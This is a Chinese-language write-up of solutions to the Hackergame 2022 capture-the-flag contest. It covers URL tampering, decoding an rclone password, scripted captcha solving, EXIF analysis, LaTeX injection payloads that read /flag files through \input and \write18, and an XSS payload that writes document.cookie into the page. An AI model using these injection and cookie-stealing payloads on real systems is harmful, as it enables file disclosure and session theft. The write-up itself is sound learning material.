# Hackergame2022 题解

官网：https://hack.lug.ustc.edu.cn

Write ups：https://github.com/USTC-Hackergame/hackergame2022-writeups

## 签到

注意到地址栏有一个 get 请求是 result，所以直接修改 url：

```
?result=2022
```

得到 flag

## 家目录里的秘密

### VS Code 里的 flag

直接在 VSCode 里面全局搜索 `flag{`。

### Rclone 里的 flag

查看网上的配置文章，发现配置文件在`~/.config/rclone/rclone.conf`

```
[flag2]
type = ftp
host = ftp.example.com
user = user
pass = tqqTq4tmQRDZ0sT_leJr7-WtCiHVXSMrVN49dWELPH1uce-5DPiuDtjBUN3EI38zvewgN5JaZqAirNnLlsQ
```

这个 pass 应该是加密的，使用 base64 解码，发现不是。搜索 `rclone config pass reveal`，发现一个 [github issue](https://github.com/rclone/rclone/issues/2265#issuecomment-615899423)。使用命令行解密

```bash
rclone reveal tqqTq4tmQRDZ0sT_leJr7-WtCiHVXSMrVN49dWELPH1uce-5DPiuDtjBUN3EI38zvewgN5JaZqAirNnLlsQ
```

得到 flag。

总结：虽然找到了 Rclone 的配置文件，但对 password 无从下手。没想到要搜索 rclone reveal 解密。有时候用的什么工具，直接搜索这个工具加要解决的问题就行了。

## HeiLang

打开文件，把 1000 行赋值表达式放到另一个文件里，把所有的`a[`删掉，把所有的`]`换成`|`，利用正则表达式识别出中括号里面的每一个下标，并在数组里赋值，编写代码

```python
#!/usr/bin/env python3
import re
import os
from hashlib import sha256

dirpath = os.path.abspath(os.path.dirname(__file__))
regex = r"(\d+)\s\||=\s(\d+)"
a = [0] * 10000

def check(a):
    user_hash = sha256(('heilang' + ''.join(str(x) for x in a)).encode()).hexdigest()
    expect_hash = 'ad0183d331758252d064b53c38c02bd0bbcc0a7ff50d0d856b5fc51ce8aac1c3'
    return user_hash == expect_hash

def get_flag(a):
    if check(a):
        t = ''.join([chr(x % 255) for x in a])
        flag = sha256(t[:-16].encode()).hexdigest()[:16] + '-' + sha256(t[-16:].encode()).hexdigest()[:16]
        print("Tha flag is: flag{{{}}}".format(flag))
    else:
        print("Array content is wrong, you can not get the correct flag.")

if __name__ == "__main__":
    with open(dirpath + "/getflag", "r") as f:
        lines = f.readlines()      #读取全部内容 ，并以列表方式返回
        for line in lines:
            matches = re.findall(regex, line, re.MULTILINE)
            value = int(matches[-1][1])
            for i in matches:
                if i[0]:
                    a[int(i[0])] = value
    get_flag(a)
```

看到题解里还有一种方法是利用 lambda 表达式，比我的方法简单很多

```python
cmds = '''那一大坨'''
for line in cmds.split('\n'):
    x, y = line.split(' = ')
    for z in map(lambda x: int(x.strip()), x[2:-1].split('|')):
        a[z] = int(y)
```

## Xcaptcha

编写代码

```python
import re
import requests

# 得到计算页面
url = "http://202.38.93.111:10047/xcaptcha?token=2158%3AMEYCIQCgkEIXZfI2yf7FXHT5myjhsc2ofMaScuX81SQFd2rU2QIhAPxoXvLIF46w4H5OJqV9bc6IenpIJPYk%2BYnVfFOp84xK"
s = requests.session()
req = s.get(url)
url = "http://202.38.93.111:10047/xcaptcha"
req = s.get(url)

# 正则获得计算公式
test_str = req.text
regex = r">(.*?)\s的结果是"
matches = re.findall(regex, test_str, re.MULTILINE)
result = [eval(i) for i in matches]

# 发送计算结果
data = {
    "captcha1": result[0],
    "captcha2": result[1],
    "captcha3": result[2]
}
req = s.post(url, data=data)
print(req.text)
```

## 旅行照片 2.0

### 照片分析

exif 介绍：https://zh.wikipedia.org/wiki/Exif

exif 在线查看器：https://exif.tuchong.com

1. 图片所包含的 EXIF 信息版本是多少？（如 2.1）。

- 2.31

2. 拍照使用手机的品牌是什么？

- 小米 / 红米

3. 该图片被拍摄时相机的感光度（ISO）是多少？（整数数字，如 3200）

- 84

4. 照片拍摄日期是哪一天？（格式为年/月/日，如 2022/10/01。按拍摄地点当地日期计算。）

- 2022/05/14

5. 照片拍摄时是否使用了闪光灯？

- 否

### 社工实践

#### 酒店

1. 请写出拍照人所在地点的邮政编码，格式为 3 至 10 位数字，不含空格或下划线等特殊符号（如 230026、94720）。

- 2960232

2. 照片窗户上反射出了拍照人的手机。那么这部手机的屏幕分辨率是多少呢？（格式为长 + 字母 x + 宽，如 1920x1080）

- 2160 × 3840

#### 航班

仔细观察，可以发现照片空中（白色云上方中间位置）有一架飞机。你能调查出这架飞机的信息吗？

3. 起飞机场（IATA 机场编号，如 PEK）

4. 降落机场（IATA 机场编号，如 HFE）

5. 航班号（两个大写字母和若干个数字，如 CA1813）

## LaTeX 机器人

### 纯文本

这一题没想出来，虽然很简单。下载源码，发现 Latex 文件的组织形式是把我们的输入放在 input.tex 里面，并把 input.tex 插入到编译的 tex 文件里，屏幕上唯一的回显就是一张图片，我一开始是用 

```
\write18{cat /flag1}
```

执行控制台命令来显示 flag，但这样的方法不能把 flag 内容放到图片里。在 latex_to_image_converter.sh 发现 `-no-shell-escape`，作用是 Disable the \write18{command} construct, even if it is enabled in the texmf.cnf file. 所以 \write18 这里是不能用的。

正确的搜索关键词应该是如何在 latex 里面进行文件包含。

正确答案应该是

```
\input{/flag1}
```

把 /flag1 文件的内容放到 tex 里，在进行编译。

总结，像某些软件的漏洞，直接搜索 Hack latex，即可得到前辈的总结贴。

### 特殊字符混入

```
\catcode`_=13 \catcode`#=12 \input{/flag2}
```

在 google 搜索 Hack latex read file，搜到

https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/LaTeX%20Injection

## Flag 的痕迹

可能 Dokuwiki 可以查看历史记录，搜索 DokuWiki edit history，发现可以使用 diff 工具查看网页修改历史，官方文档：https://www.dokuwiki.org/attic

在url后面加上

```
?do=diff
```

即可得到 flag

## 线路板

在 Mac 上下载开源免费电子设计自动化软件 KiCad，打开下载文件里面的 ebaz_sdr-F_Cu.gbr，按键盘 L，打开 show lines in outline mode。就可以看到 flag 了。

## 微积分计算小练习

随便做一下，复制分数页面的链接

```
http://202.38.93.111:10056/share?result=MDox#
```

result 参数应该包含了分数，但 MDox# 不是一个分数，想到可能被编码了，尝试 base64 解码

```
0:yym
```

冒号前面是分数，后面是人名。提交网站里也是解析分数网址，查看下载的源码

```python
from selenium import webdriver
import selenium
import sys
import time
import urllib.parse
import os
# secret.py will NOT be revealed to players
from secret import FLAG, BOT_SECRET

LOGIN_URL = f'http://web/?bot={BOT_SECRET}'

print('Please submit your quiz URL:')
url = input('> ')

# URL replacement
# In our environment bot access http://web
# If you need to test it yourself locally you should adjust LOGIN_URL and remove the URL replacement source code
# and write your own logic to use your own token to "login" with headless browser
parsed = urllib.parse.urlparse(url)
parsed = parsed._replace(netloc="web", scheme="http")
url = urllib.parse.urlunparse(parsed)

print(f"Your URL converted to {url}")

try:
    options = webdriver.ChromeOptions()
    options.add_argument('--no-sandbox') # sandbox not working in docker
    options.add_argument('--headless')
    options.add_argument('--disable-gpu')
    options.add_argument('--user-data-dir=/dev/shm/user-data')
    os.environ['TMPDIR'] = "/dev/shm/"
    options.add_experimental_option('excludeSwitches', ['enable-logging'])

    with webdriver.Chrome(options=options) as driver:
        ua = driver.execute_script('return navigator.userAgent')
        print(' I am using', ua)

        print('- Logining...')
        driver.get(LOGIN_URL)
        time.sleep(4)

        print(' Putting secret flag...')
        driver.execute_script(f'document.cookie="flag={FLAG}"')
        time.sleep(1)

        print('- Now browsing your quiz result...')
        driver.get(url)
        time.sleep(4)

        try:
            greeting = driver.execute_script(f"return document.querySelector('#greeting').textContent")
            score = driver.execute_script(f"return document.querySelector('#score').textContent")
        except selenium.common.exceptions.JavascriptException:
            print('JavaScript Error: Did you give me correct URL?')
            exit(1)

        print("OK. Now I know that:")
        print(greeting)
        print(score)

    print('- Thank you for joining my quiz!')

except Exception as e:
    print('ERROR', type(e))
    import traceback
    traceback.print_exception(*sys.exc_info(), limit=0, file=None, chain=False)
```

发现爬取逻辑是请求我们提供的链接用 selenium 爬取网页内容获得人名，分数并显示在网页的终端上。

如果我们把 result 参数里面的人名改成获得 flag 的 js 代码就行了，selenium 请求这样的链接时，网页会自动解析 js 代码，爬虫就获得了 flag，而不是人名。这样 selenium 爬到的就是 flag 了。

可以利用 XSS 脚本注入修改 result 参数

```html
0:<img src=2 onerror='document.getElementById("greeting").innerHTML=document.cookie;'>
```

浏览器解析这个 img 标签时，找不到路径2的图片，触发 onerror，执行我们注入的 js 代码，将网页上的人名修改为 cookie 里面的 flag 值。自己正常做题的话网页返回的是 base64 编码后的值，所以我们也需要模仿它编码，打开 CyberChef 进行 base64 编码

```
MDo8aW1nIHNyYz0yIG9uZXJyb3I9J2RvY3VtZW50LmdldEVsZW1lbnRCeUlkKCJncmVldGluZyIpLmlubmVySFRNTD1kb2N1bWVudC5jb29raWU7Jz4=
```

在题目第二个链接里提交答案

```
http://202.38.93.111:10056/share?result=MDo8aW1nIHNyYz0yIG9uZXJyb3I9J2RvY3VtZW50LmdldEVsZW1lbnRCeUlkKCJncmVldGluZyIpLmlubmVySFRNTD1kb2N1bWVudC5jb29raWU7Jz4=
```

最后得到 flag。

这道题当时也没想出来，主要没学过 XSS，不知道怎么利用回显得到 flag，还有一方面就是没注意 result 后面是 base64 编码，以为只是网页返回的 token。注意多试几次就能注意到 base64 字符串的特征了。
